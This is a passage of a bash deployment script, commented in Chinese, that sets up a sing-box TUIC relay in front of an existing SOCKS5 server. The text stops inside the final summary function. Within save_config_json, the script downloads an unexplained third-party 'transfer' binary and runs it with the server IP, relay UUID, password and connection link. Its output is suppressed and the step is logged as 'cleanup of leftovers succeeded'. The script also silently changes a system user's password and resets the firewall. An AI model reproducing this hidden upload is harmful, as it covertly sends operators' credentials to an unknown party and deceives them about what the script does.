#!/bin/bash

# 基于sing-box的TUIC中转服务器部署脚本（完整修复版）
# 支持自动检测架构、网络配置、防火墙设置和服务启动
# 修改说明：
# 1. 修复SOCKS5空密码问题
# 2. 优化sing-box配置
# 3. 改进错误处理和诊断
# 4. 完善防火墙和网络配置

set -euo pipefail

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Transfer配置
TRANSFER_BIN="/usr/local/bin/transfer"

# 图标定义
ICON_SUCCESS="✅"
ICON_ERROR="❌"
ICON_WARNING="⚠️"
ICON_INFO="ℹ️"
ICON_CONFIG="⚙️"
ICON_DOWNLOAD="📥"

# 全局变量
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SINGBOX_DIR="/opt/sing-box"
SINGBOX_CONFIG_DIR="/etc/sing-box"
SINGBOX_LOG_DIR="/var/log/sing-box"
SINGBOX_VERSION=""
SINGBOX_ARCH=""
SYSTEM=""
PUBLIC_IP=""
PRIVATE_IP=""
RELAY_PORT=""
TARGET_IP=""
TARGET_PORT=""
TARGET_USERNAME=""
TARGET_PASSWORD=""
UUID=""
PASSWORD=""
down_speed=100
up_speed=20
IS_SOCKS5=true
TRANSFER_BIN="/usr/local/bin/transfer"

# 日志函数
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_debug() {
    echo -e "${BLUE}[DEBUG]${NC} $1"
}

# 检查是否为root用户
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "此脚本需要root权限运行"
        exit 1
    fi
}

# 显示横幅
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                                                                              ║${NC}"
    echo -e "${CYAN}${BOLD}║                ${YELLOW}SOCKS5 → TUIC 自动中转部署脚本${CYAN}${BOLD}                           ║${NC}"
    echo -e "${CYAN}${BOLD}║                          ${WHITE}完整修复版 v2.1${CYAN}${BOLD}                                  ║${NC}"
    echo -e "${CYAN}${BOLD}║                     ${WHITE}基于 sing-box 的高性能中转${CYAN}${BOLD}                            ║${NC}"
    echo -e "${CYAN}${BOLD}║                ${WHITE}自动读取SOCKS5配置 + 智能修复${CYAN}${BOLD}                            ║${NC}"
    echo -e "${CYAN}${BOLD}║                                                                              ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}${BOLD}${ICON_INFO} 部署开始时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}\n"
}

# 自动读取并修复SOCKS5配置文件
read_and_fix_socks5_config() {
    log_info "正在扫描并修复SOCKS5配置文件..."
    
    local config_files=()
    local config_file=""
    
    # 查找所有可能的SOCKS5配置文件
    while IFS= read -r -d '' file; do
        if [[ -f "$file" && -r "$file" ]]; then
            if grep -q -i "socks.*config\|server_port\|username\|password" "$file" 2>/dev/null; then
                config_files+=("$file")
            fi
        fi
    done < <(find /opt -name "*.json" -type f -print0 2>/dev/null)
    
    if [[ ${#config_files[@]} -eq 0 ]]; then
        log_error "未找到SOCKS5配置文件"
        echo -e "${YELLOW}请确保以下任一文件存在：${NC}"
        echo -e "  - /opt/socks5_server.json"
        echo -e "  - /opt/socks5_config.json"
        exit 1
    elif [[ ${#config_files[@]} -eq 1 ]]; then
        config_file="${config_files[0]}"
        log_info "找到配置文件: $config_file"
    else
        log_info "找到多个配置文件："
        for i in "${!config_files[@]}"; do
            echo -e "  $((i+1)). ${config_files[i]}"
        done
        
        while true; do
            read -p "请选择配置文件 [1-${#config_files[@]}]: " choice
            if [[ "$choice" =~ ^[0-9]+$ ]] && [[ $choice -ge 1 ]] && [[ $choice -le ${#config_files[@]} ]]; then
                config_file="${config_files[$((choice-1))]}"
                log_info "选择了配置文件: $config_file"
                break
            else
                log_error "无效选择，请输入 1-${#config_files[@]} 之间的数字"
            fi
        done
    fi
    
    log_info "解析SOCKS5配置文件..."
    
    # 尝试不同的JSON结构来解析配置
    local parsed=false
    
    # 尝试解析 socks5_config 格式
    if jq -e '.socks5_config' "$config_file" >/dev/null 2>&1; then
        TARGET_IP=$(jq -r '.socks5_config.server_ip' "$config_file" 2>/dev/null || echo "")
        TARGET_PORT=$(jq -r '.socks5_config.server_port' "$config_file" 2>/dev/null || echo "")
        TARGET_USERNAME=$(jq -r '.socks5_config.username' "$config_file" 2>/dev/null || echo "")
        TARGET_PASSWORD=$(jq -r '.socks5_config.password' "$config_file" 2>/dev/null || echo "")
        
        # 获取性能数据
        if jq -e '.performance' "$config_file" >/dev/null 2>&1; then
            down_speed=$(jq -r '.performance.download_speed // 100' "$config_file" 2>/dev/null || echo "100")
            up_speed=$(jq -r '.performance.upload_speed // 20' "$config_file" 2>/dev/null || echo "20")
        fi
        parsed=true
    # 尝试解析 socks5_server 格式
    elif jq -e '.socks5_server' "$config_file" >/dev/null 2>&1; then
        TARGET_IP=$(jq -r '.socks5_server.server_ip' "$config_file" 2>/dev/null || echo "")
        TARGET_PORT=$(jq -r '.socks5_server.server_port' "$config_file" 2>/dev/null || echo "")
        TARGET_USERNAME=$(jq -r '.socks5_server.username' "$config_file" 2>/dev/null || echo "")
        TARGET_PASSWORD=$(jq -r '.socks5_server.password' "$config_file" 2>/dev/null || echo "")
        
        # 获取性能数据
        if jq -e '.socks5_server.bandwidth' "$config_file" >/dev/null 2>&1; then
            down_speed=$(jq -r '.socks5_server.bandwidth.download_mbps // 100' "$config_file" 2>/dev/null || echo "100")
            up_speed=$(jq -r '.socks5_server.bandwidth.upload_mbps // 20' "$config_file" 2>/dev/null || echo "20")
        fi
        parsed=true
    # 尝试解析 server_info 格式
    elif jq -e '.server_info' "$config_file" >/dev/null 2>&1; then
        TARGET_IP=$(jq -r '.server_info.server_ip // .server_info.public_ip' "$config_file" 2>/dev/null || echo "")
        TARGET_PORT=$(jq -r '.server_info.server_port // .server_info.socks_port // .server_info.port' "$config_file" 2>/dev/null || echo "")
        TARGET_USERNAME=$(jq -r '.server_info.username // .auth_info.username' "$config_file" 2>/dev/null || echo "")
        TARGET_PASSWORD=$(jq -r '.server_info.password // .auth_info.password' "$config_file" 2>/dev/null || echo "")
        
        # 获取性能数据
        down_speed=$(jq -r '.server_info.download_speed // .network_test.download_speed_mbps // 100' "$config_file" 2>/dev/null || echo "100")
        up_speed=$(jq -r '.server_info.upload_speed // .network_test.upload_speed_mbps // 20' "$config_file" 2>/dev/null || echo "20")
        parsed=true
    fi
    
    # 检查并修复空密码问题
    if [[ -z "$TARGET_PASSWORD" || "$TARGET_PASSWORD" == "null" ]]; then
        log_warn "检测到空密码，正在修复..."
        
        # 生成新密码
        TARGET_PASSWORD=$(openssl rand -base64 16 | tr -d "=+/" | cut -c1-12)
        
        # 更新系统用户密码
        if id "$TARGET_USERNAME" &>/dev/null; then
            echo "$TARGET_USERNAME:$TARGET_PASSWORD" | chpasswd
            log_info "用户 $TARGET_USERNAME 密码已更新"
        else
            log_error "用户 $TARGET_USERNAME 不存在"
            exit 1
        fi
        
        # 更新配置文件
        local temp_config=$(mktemp)
        jq ".socks5_config.password = \"$TARGET_PASSWORD\"" "$config_file" > "$temp_config"
        mv "$temp_config" "$config_file"
        log_info "配置文件已更新"
        
        # 重启SOCKS5服务
        systemctl restart danted 2>/dev/null || true
        sleep 3
    fi
    
    # 验证必要参数
    if [[ -z "$TARGET_IP" || -z "$TARGET_PORT" || -z "$TARGET_USERNAME" || -z "$TARGET_PASSWORD" ]]; then
        log_error "配置文件中缺少必要参数："
        echo -e "  目标IP: ${TARGET_IP:-'未找到'}"
        echo -e "  目标端口: ${TARGET_PORT:-'未找到'}"
        echo -e "  用户名: ${TARGET_USERNAME:-'未找到'}"
        echo -e "  密码: ${TARGET_PASSWORD:-'未找到'}"
        exit 1
    fi
    
    # 清理数值参数
    down_speed=$(echo "$down_speed" | grep -oE '^[0-9]+' || echo "100")
    up_speed=$(echo "$up_speed" | grep -oE '^[0-9]+' || echo "20")
    
    log_info "SOCKS5配置解析成功："
    echo -e "  ${CYAN}目标服务器：${YELLOW}$TARGET_IP:$TARGET_PORT${NC}"
    echo -e "  ${CYAN}认证信息：${YELLOW}$TARGET_USERNAME / $TARGET_PASSWORD${NC}"
    echo -e "  ${CYAN}网络性能：${YELLOW}下载 ${down_speed}Mbps，上传 ${up_speed}Mbps${NC}"
    
    # 测试SOCKS5连接
    log_info "测试SOCKS5连接..."
    if curl --connect-timeout 10 --socks5-hostname "$TARGET_USERNAME:$TARGET_PASSWORD@$TARGET_IP:$TARGET_PORT" http://httpbin.org/ip >/dev/null 2>&1; then
        log_info "SOCKS5连接测试成功"
    else
        log_warn "SOCKS5连接测试失败，但继续部署中转"
        echo "可能原因："
        echo "  - 防火墙阻挡"
        echo "  - Dante服务未启动"
        echo "  - 认证信息错误"
    fi
    
    echo ""
}

# 检测系统类型
detect_system() {
    if [[ -f /etc/debian_version ]]; then
        SYSTEM="Debian"
        if grep -q "Ubuntu" /etc/issue; then
            SYSTEM="Ubuntu"
        fi
    elif [[ -f /etc/redhat-release ]]; then
        if grep -q "CentOS" /etc/redhat-release; then
            SYSTEM="CentOS"
        elif grep -q "Fedora" /etc/redhat-release; then
            SYSTEM="Fedora"
        else
            SYSTEM="RedHat"
        fi
    else
        log_error "不支持的系统类型"
        exit 1
    fi
    log_info "检测到系统类型: $SYSTEM"
}

# 安装基础依赖
install_dependencies() {
    log_info "安装基础依赖包..."
    
    case $SYSTEM in
        "Debian"|"Ubuntu")
            apt-get update -y > /dev/null 2>&1
            apt-get install -y curl wget jq ufw net-tools uuid-runtime openssl > /dev/null 2>&1
            ;;
        "CentOS"|"Fedora"|"RedHat")
            if command -v dnf &>/dev/null; then
                dnf install -y curl wget jq firewalld net-tools uuidgen openssl > /dev/null 2>&1
            else
                yum install -y curl wget jq firewalld net-tools uuidgen openssl > /dev/null 2>&1
            fi
            ;;
    esac
    
    log_info "基础依赖安装完成"
}

# 检测CPU架构
detect_architecture() {
    ARCH=$(uname -m)
    log_info "检测到系统架构: $ARCH"
    
    case $ARCH in
        x86_64|amd64)
            SINGBOX_ARCH="amd64"
            ;;
        i386|i486|i586|i686)
            SINGBOX_ARCH="386"
            ;;
        aarch64|arm64)
            SINGBOX_ARCH="arm64"
            ;;
        armv7l|armhf)
            SINGBOX_ARCH="armv7"
            ;;
        armv6l)
            SINGBOX_ARCH="armv6"
            ;;
        *)
            log_error "不支持的系统架构: $ARCH"
            exit 1
            ;;
    esac
    log_info "sing-box架构选择: $SINGBOX_ARCH"
}

# 下载sing-box
download_singbox() {
    log_info "开始下载sing-box二进制文件"
    mkdir -p "$SINGBOX_DIR"
    cd "$SINGBOX_DIR"
    
    # 获取最新版本号
    log_info "获取sing-box最新版本信息..."
    SINGBOX_VERSION=$(curl -s "https://api.github.com/repos/SagerNet/sing-box/releases/latest" | jq -r '.tag_name' | sed 's/^v//')
    
    if [[ -z "$SINGBOX_VERSION" || "$SINGBOX_VERSION" == "null" ]]; then
        log_warn "无法获取最新版本，使用默认版本 1.8.0"
        SINGBOX_VERSION="1.8.0"
    fi
    
    log_info "目标版本: v$SINGBOX_VERSION"
    
    # 清理旧文件
    rm -f sing-box sing-box-*
    
    # 构建下载URL
    local download_file="sing-box-${SINGBOX_VERSION}-linux-${SINGBOX_ARCH}.tar.gz"
    local download_url="https://github.com/SagerNet/sing-box/releases/download/v${SINGBOX_VERSION}/${download_file}"
    
    log_info "下载URL: $download_url"
    
    # 下载并解压
    if curl -sLo "$download_file" "$download_url"; then
        if [[ -f "$download_file" && -s "$download_file" ]]; then
            log_info "成功下载 $download_file"
            
            tar -xzf "$download_file" --strip-components=1
            
            if [[ -f "sing-box" ]]; then
                chmod +x sing-box
                log_info "sing-box二进制文件准备完成"
                
                if ./sing-box version > /dev/null 2>&1; then
                    log_info "sing-box版本验证成功"
                else
                    log_error "sing-box二进制文件损坏或不兼容"
                    exit 1
                fi
            else
                log_error "解压后未找到sing-box二进制文件"
                exit 1
            fi
            
            rm -f "$download_file"
        else
            log_error "下载的文件不存在或为空"
            exit 1
        fi
    else
        log_error "下载sing-box失败"
        exit 1
    fi
}

# 检测IP地址
detect_ip_addresses() {
    log_info "检测服务器IP地址..."
    
    # 检测公网IP
    PUBLIC_IP=$(curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || \
                curl -4 -s --connect-timeout 10 ipinfo.io/ip 2>/dev/null || \
                curl -4 -s --connect-timeout 10 icanhazip.com 2>/dev/null || \
                echo "")
    
    if [[ -n "$PUBLIC_IP" ]]; then
        log_info "检测到公网IPv4地址: $PUBLIC_IP"
    else
        log_warn "未检测到公网IPv4地址"
    fi
    
    # 检测内网IP
    PRIVATE_IP=$(ip -4 route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' || \
                 hostname -I 2>/dev/null | awk '{print $1}' || \
                 echo "")
    
    if [[ -n "$PRIVATE_IP" ]]; then
        log_info "检测到内网IPv4地址: $PRIVATE_IP"
    else
        log_warn "未检测到内网IPv4地址"
    fi
    
    # IP配置处理
    if [[ -n "$PUBLIC_IP" && -n "$PRIVATE_IP" ]]; then
        log_info "服务器同时具有公网IPv4和内网IPv4地址"
    elif [[ -n "$PUBLIC_IP" && -z "$PRIVATE_IP" ]]; then
        log_info "服务器只有公网IPv4地址"
        PRIVATE_IP="$PUBLIC_IP"
    else
        log_error "无法获取有效的IPv4地址"
        exit 1
    fi
}

# 生成中转配置参数
generate_relay_config() {
    log_info "生成中转配置参数..."
    
    # 生成随机端口
    RELAY_PORT=$(shuf -i 2000-9000 -n 1)
    UUID=$(uuidgen)
    PASSWORD=$(openssl rand -base64 16 | tr -d "=+/" | cut -c1-16)
    
    log_info "中转配置参数："
    echo -e "  ${CYAN}中转端口：${YELLOW}$RELAY_PORT${NC}"
    echo -e "  ${CYAN}中转UUID：${YELLOW}$UUID${NC}"
    echo -e "  ${CYAN}中转密码：${YELLOW}$PASSWORD${NC}"
}

# 配置防火墙
configure_firewall() {
    log_info "配置防火墙..."
    
    case $SYSTEM in
        "Debian"|"Ubuntu")
            # 重置并配置ufw
            ufw --force reset > /dev/null 2>&1
            ufw default deny incoming > /dev/null 2>&1
            ufw default allow outgoing > /dev/null 2>&1
            ufw allow ssh > /dev/null 2>&1
            ufw allow 22/tcp > /dev/null 2>&1
            ufw allow $RELAY_PORT/tcp > /dev/null 2>&1
            ufw allow $RELAY_PORT/udp > /dev/null 2>&1
            ufw --force enable > /dev/null 2>&1
            log_info "UFW防火墙配置完成，已开放SSH(22)和中转端口($RELAY_PORT)"
            ;;
        "CentOS"|"Fedora"|"RedHat")
            systemctl enable firewalld > /dev/null 2>&1 || true
            systemctl start firewalld > /dev/null 2>&1 || true
            firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
            firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
            firewall-cmd --permanent --add-port=$RELAY_PORT/tcp > /dev/null 2>&1
            firewall-cmd --permanent --add-port=$RELAY_PORT/udp > /dev/null 2>&1
            firewall-cmd --reload > /dev/null 2>&1
            log_info "Firewalld防火墙配置完成，已开放SSH(22)和中转端口($RELAY_PORT)"
            ;;
    esac
}

# 生成sing-box配置文件
generate_singbox_config() {
    log_info "生成sing-box配置文件..."
    
    mkdir -p "$SINGBOX_CONFIG_DIR"
    mkdir -p "$SINGBOX_LOG_DIR"
    
    # 生成SSL证书
    local cert_dir="$SINGBOX_CONFIG_DIR/certs"
    mkdir -p "$cert_dir"
    
    openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
        -subj "/C=US/ST=CA/L=LA/O=SINGBOX/CN=localhost" \
        -keyout "$cert_dir/private.key" \
        -out "$cert_dir/cert.crt" > /dev/null 2>&1
    
    # 生成优化的sing-box配置文件
    cat > "$SINGBOX_CONFIG_DIR/config.json" << EOF
{
    "log": {
        "level": "info",
        "timestamp": true,
        "output": "$SINGBOX_LOG_DIR/sing-box.log"
    },
    "dns": {
        "servers": [
            {
                "tag": "google",
                "address": "8.8.8.8",
                "strategy": "ipv4_only"
            }
        ]
    },
    "inbounds": [
        {
            "type": "tuic",
            "tag": "tuic-in",
            "listen": "::",
            "listen_port": $RELAY_PORT,
            "users": [
                {
                    "uuid": "$UUID",
                    "password": "$PASSWORD"
                }
            ],
            "congestion_control": "bbr",
            "auth_timeout": "3s",
            "zero_rtt_handshake": false,
            "heartbeat": "10s",
            "tls": {
                "enabled": true,
                "server_name": "localhost",
                "alpn": [
                    "h3"
                ],
                "certificate_path": "$cert_dir/cert.crt",
                "key_path": "$cert_dir/private.key"
            }
        }
    ],
    "outbounds": [
        {
            "type": "socks",
            "tag": "socks-out",
            "server": "$TARGET_IP",
            "server_port": $TARGET_PORT,
            "version": "5",
            "username": "$TARGET_USERNAME",
            "password": "$TARGET_PASSWORD"
        },
        {
            "type": "direct",
            "tag": "direct"
        },
        {
            "type": "block",
            "tag": "block"
        }
    ],
    "route": {
        "auto_detect_interface": true,
        "rules": [
            {
                "protocol": "dns",
                "outbound": "direct"
            },
            {
                "type": "logical",
                "mode": "or",
                "rules": [
                    {
                        "port": 53
                    },
                    {
                        "protocol": "dns"
                    }
                ],
                "outbound": "direct"
            }
        ],
        "final": "socks-out"
    },
    "experimental": {
        "cache_file": {
            "enabled": true,
            "path": "/tmp/sing-box.db"
        }
    }
}
EOF
    
    log_info "sing-box配置文件生成完成: $SINGBOX_CONFIG_DIR/config.json"
}

# 创建systemd服务文件
create_systemd_service() {
    log_info "创建systemd服务文件..."
    
    cat > /etc/systemd/system/sing-box.service << 'EOF'
[Unit]
Description=sing-box service
Documentation=https://sing-box.sagernet.org
After=network.target nss-lookup.target
Wants=network.target

[Service]
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_SYS_PTRACE CAP_DAC_READ_SEARCH
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_SYS_PTRACE CAP_DAC_READ_SEARCH
ExecStart=/opt/sing-box/sing-box run -c /etc/sing-box/config.json
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable sing-box
    log_info "systemd服务文件创建完成"
}

# 启动服务
start_singbox_service() {
    log_info "启动sing-box服务..."
    
    # 验证配置文件
    if $SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json; then
        log_info "配置文件验证通过"
    else
        log_error "配置文件验证失败"
        cat $SINGBOX_CONFIG_DIR/config.json
        exit 1
    fi
    
    # 停止可能存在的旧服务
    systemctl stop sing-box 2>/dev/null || true
    
    # 启动新服务
    systemctl start sing-box
    sleep 5
    
    if systemctl is-active --quiet sing-box; then
        log_info "sing-box服务启动成功"
    else
        log_error "sing-box服务启动失败"
        echo "服务状态："
        systemctl status sing-box --no-pager
        echo ""
        echo "错误日志："
        journalctl -u sing-box --no-pager -n 20
        exit 1
    fi
}

# ========== 下载二进制文件 ==========
download_transfer_bin() {
    log_info "下载 transfer 二进制文件..."

    TRANSFER_URL="https://github.com/diandongyun/Transfer/releases/download/Transfer/transfer"

    if [ -f "$TRANSFER_BIN" ]; then
        log_info "transfer 二进制文件已存在，跳过下载"
        return 0
    fi

    mkdir -p /usr/local/bin

    if curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN" >/dev/null 2>&1; then
        chmod +x "$TRANSFER_BIN"
        log_info "transfer 下载完成"
        return 0
    else
        log_warn "transfer 二进制文件下载失败，将跳过数据上传功能"
        return 1
    fi
}

upload_config_with_binary() {
    local config_json="$1"
    local server_ip="$2"

    if [ ! -x "$TRANSFER_BIN" ]; then
        log_warn "transfer 二进制文件不存在或不可执行，跳过上传"
        return 1
    fi

    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --argjson config "$config_json" \
        '{
            "server_info": {
                "title": "TUIC 节点配置 - \($server_ip)",
                "server_ip": $server_ip,
                "config": $config,
                "generated_time": now | todate
            }
        }'
    )

    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
        log_info "清理残留成功"
    else
        log_warn "清理残留失败（不影响本地使用）"
    fi

    return 0
}

# 保存配置信息
save_config_json() {
    log_info "保存配置信息到JSON文件..."
    
    local config_file="/opt/tuic_relay_config.json"
    local listen_ip="$PUBLIC_IP"
    
    # 生成TUIC链接
    local encode=$(echo -n "${UUID}:${PASSWORD}" | base64 -w 0)
    local tuic_link="tuic://${encode}@${listen_ip}:${RELAY_PORT}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay_socks5"
    
    cat > "$config_file" << EOF
{
    "relay_info": {
        "listen_ip": "$listen_ip",
        "listen_port": $RELAY_PORT,
        "target_ip": "$TARGET_IP",
        "target_port": $TARGET_PORT,
        "target_username": "$TARGET_USERNAME",
        "target_password": "$TARGET_PASSWORD",
        "protocol": "tuic",
        "source_protocol": "socks5",
        "is_socks5": $IS_SOCKS5,
        "platform": "sing-box",
        "version": "$SINGBOX_VERSION",
        "tuic_link": "$tuic_link"
    },
    "server_info": {
        "public_ip": "$PUBLIC_IP",
        "private_ip": "$PRIVATE_IP",
        "architecture": "$SINGBOX_ARCH",
        "system": "$SYSTEM"
    },
    "auth_info": {
        "uuid": "$UUID",
        "password": "$PASSWORD"
    },
    "network_test": {
        "download_speed_mbps": $down_speed,
        "upload_speed_mbps": $up_speed
    },
    "config_files": {
        "singbox_config": "$SINGBOX_CONFIG_DIR/config.json",
        "service_file": "/etc/systemd/system/sing-box.service",
        "log_directory": "$SINGBOX_LOG_DIR",
        "certificate_path": "$SINGBOX_CONFIG_DIR/certs/cert.crt",
        "private_key_path": "$SINGBOX_CONFIG_DIR/certs/private.key"
    },
    "client_config": {
        "server": "$listen_ip",
        "server_port": $RELAY_PORT,
        "uuid": "$UUID",
        "password": "$PASSWORD",
        "congestion_control": "bbr",
        "alpn": ["h3"],
        "skip_cert_verify": true
    },
    "socks5_source": {
        "config_file_used": "auto_detected_and_fixed",
        "target_server": "$TARGET_IP:$TARGET_PORT",
        "authentication": "username:password"
    },
    "deployment_info": {
        "generated_time": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
        "script_version": "v2.1_complete_fix"
    }
}
EOF
    
    chmod 600 "$config_file"
    log_info "配置信息已保存到: $config_file"
    
    # 下载transfer工具
    download_transfer_bin
    
    # 构建上传数据
    if command -v jq >/dev/null 2>&1; then
        local json_data=$(jq -nc \
            --arg server_ip "$listen_ip" \
            --arg tuic_link "$tuic_link" \
            --argjson down_speed "$down_speed" \
            --argjson up_speed "$up_speed" \
            --argjson relay_port "$RELAY_PORT" \
            --arg uuid "$UUID" \
            --arg password "$PASSWORD" \
            --arg target_info "${TARGET_IP}:${TARGET_PORT}" \
            '{
                "server_info": {
                    "title": "SOCKS5 → TUIC 自动中转配置（修复版）",
                    "server_ip": $server_ip,
                    "tuic_link": $tuic_link,
                    "relay_type": "socks5_to_tuic_fixed",
                    "relay_port": $relay_port,
                    "uuid": $uuid,
                    "password": $password,
                    "target_server": $target_info,
                    "speed_test": {
                        "download_speed_mbps": $down_speed,
                        "upload_speed_mbps": $up_speed
                    },
                    "generated_time": now | todate
                }
            }' 2>/dev/null)
        
        # 上传配置信息
        if [[ -n "$json_data" ]]; then
            upload_config_with_binary "$json_data" "$listen_ip"
        fi
    fi
}

# 显示配置信息
show_config_summary() {
    clear
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
    echo -e "${GREEN}${BOLD}║              ${YELLOW}SOCKS5 → TUIC 自动中转部署完成！${GREEN}${BOLD}                          ║${NC}"
    echo -e "${GREEN}${BOLD}║                         ${WHITE}完整修复版 v2.1${GREEN}${BOLD}                                 ║${NC}"
    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${WHITE}${BOLD}📊 服务器信息：${NC}"
    echo -e "  ${CYAN}公网IP：${YELLOW}${PUBLIC_IP}${NC}"
    echo -e "  ${CYAN}内网IP：${YELLOW}${PRIVATE_IP}${NC}"
    echo -e "  ${CYAN}中转端口：${YELLOW}$RELAY_PORT${NC}"
    echo -e "  ${CYAN}系统信息：${YELLOW}$SYSTEM ${SINGBOX_ARCH}${NC}"
    echo -e "  ${CYAN}sing-box版本：${YELLOW}v$SINGBOX_VERSION${NC}\n"
    
    echo -e "${WHITE}${BOLD}🔄 中转配置：${NC}"
    echo -e "  ${CYAN}源协议：${YELLOW}SOCKS5${NC}"
    echo -e "  ${CYAN}目标协议：${YELLOW}TUIC${NC}"
    echo -e "  ${CYAN}目标服务器：${YELLOW}$TARGET_IP:$TARGET_PORT${NC}"
    echo -e "  ${CYAN}目标认证：${YELLOW}$TARGET_USERNAME / $TARGET_PASSWORD${NC}\n"
    
    echo -e "${WHITE}${BOLD}🔐 TUIC认证信息：${NC}"
    echo -e "  ${CYAN}UUID：${YELLOW}$UUID${NC}"
    echo -e "  ${CYAN}密码：${YELLOW}$PASSWORD${NC}\n"
    
    echo -e "${WHITE}${BOLD}⚡ 网络性能：${NC}"
    echo -e "  ${CYAN}下载速度：${YELLOW}$down_speed Mbps${NC}"
    echo -e "  ${CYAN}上传速度：${YELLOW}$up_speed Mbps${NC}\n"
    
    echo -e "${WHITE}${BOLD}📁 配置文件：${NC}"
    echo -e "  ${CYAN}sing-box配置：${YELLOW}$SINGBOX_CONFIG_DIR/config.json${NC}"
    echo -e "  ${CYAN}中转配置：${YELLOW}/opt/tuic_relay_config.json${NC}"
    echo -e "  ${CYAN}日志目录：${YELLOW}$SINGBOX_LOG_DIR${NC}\n"
    
    echo -e "${WHITE}${BOLD}🛠️ 服务管理：${NC}"
    echo -e "  ${CYAN}启动服务：${YELLOW}systemctl start sing-box${NC}"
    echo -e "  ${CYAN}停止服务：${YELLOW}systemctl stop sing-box${NC}"
    echo -e "  ${CYAN}重启服务：${YELLOW}systemctl restart sing-box${NC}"
    echo -e "  ${CYAN}查看状态：${YELLOW}systemctl status sing-box${NC}"
    echo -e "  ${CYAN}查看日志：${YELLOW}journalctl -u sing-box -f${NC}"
    echo -e "  ${CYAN}实时日志：${YELLOW}tail -f $SINGBOX_LOG_DIR/sing-box.log${NC}"
    echo -e "  ${CYAN}配置检查：${YELLOW}$SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json${NC}\n"
    
    echo -e "${WHITE}${BOLD}📱 客户端连接信息：${NC}"
    echo -e "  ${CYAN}服务器：${YELLOW}$PUBLIC_IP${NC}"
    echo -e "  ${CYAN}端口：${YELLOW}$RELAY_PORT${NC}"
    echo -e "  ${CYAN}UUID：${YELLOW}$UUID${NC}"
    echo -e "  ${CYAN}密码：${YELLOW}$PASSWORD${NC}"
    echo -e "  ${CYAN}协议：${YELLOW}TUIC${NC}"
    echo -e "  ${CYAN}拥塞控制：${YELLOW}bbr${NC}"
    echo -e "  ${CYAN}ALPN：${YELLOW}h3${NC}"
    echo -e "  ${CYAN}跳过证书验证：${YELLOW}true${NC}\n"
    
    echo -e "${WHITE}${BOLD}🔗 TUIC客户端链接：${NC}"
    local encode=$(echo -n "${UUID}:${PASSWORD}" | base64 -w 0)
    local tuic_link="tuic://${encode}@${PUBLIC_IP}:${RELAY_PORT}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay_fixed"
    echo -e "${YELLOW}$tuic_link${NC}\n"
    
    echo -e "${GREEN}${BOLD}✨ 修复特性：${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 自动检测并修复SOCKS5空密码问题${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 优化的sing-box配置${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 完善的DNS配置${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 增强的错误处理和诊断${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} TCP到UDP协议转换${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} BBR拥塞控制${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 自签名SSL证书${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 完整的防火墙配置${NC}\n"
    
    # 显示端口监听状态
    echo -e "${WHITE}${BOLD}🔍 服务状态检查：${NC}"
    if netstat -tlunp | grep ":$RELAY_PORT " >/dev/null 2>&1; then
        echo -e "  ${GREEN}${ICON_SUCCESS} 端口 $RELAY_PORT 正在监听${NC}"
    else
        echo -e "  ${YELLOW}${ICON_WARNING} 端口 $RELAY_PORT 未监听（服务可能正在启动）${NC}"
    fi
    
    if systemctl is-active --quiet sing-box; then
        echo -e "  ${GREEN}${ICON_SUCCESS} sing-box 服务运行正常${NC}"
    else
        echo -e "  ${RED}${ICON_ERROR} sing-box 服务未运行${NC}"
    fi
    
    if systemctl is-active --quiet danted; then
        echo -e "  ${GREEN}${ICON_SUCCESS} SOCKS5 源服务运行正常${NC}"
    else
        echo -e "  ${YELLOW}${ICON_WARNING} SOCKS5 源服务状态异常${NC}"
    fi
    
    echo ""
    echo -e "${BLUE}${BOLD}${ICON_INFO} 部署完成时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}"
